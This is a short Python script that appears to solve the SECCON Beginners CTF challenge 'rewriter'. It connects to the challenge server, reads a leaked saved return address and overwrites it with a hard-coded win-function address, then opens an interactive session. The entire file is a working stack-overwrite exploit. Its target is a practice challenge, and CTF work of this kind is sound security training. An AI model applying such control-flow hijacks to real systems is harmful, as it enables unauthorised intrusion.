from ptrlib import *

win = b'0x4011f6'
sock = Socket('rewriter.quals.beginners.seccon.jp', 4103)

for i in range(10):
    sock.recvline()

ret_addr = sock.recvline().decode().split('|')[0].strip(' ')
print("saved ret addr = ", ret_addr)

sock.sendlineafter(b'> ', ret_addr.encode())
sock.sendlineafter(b'= ', win)

sock.interactive()
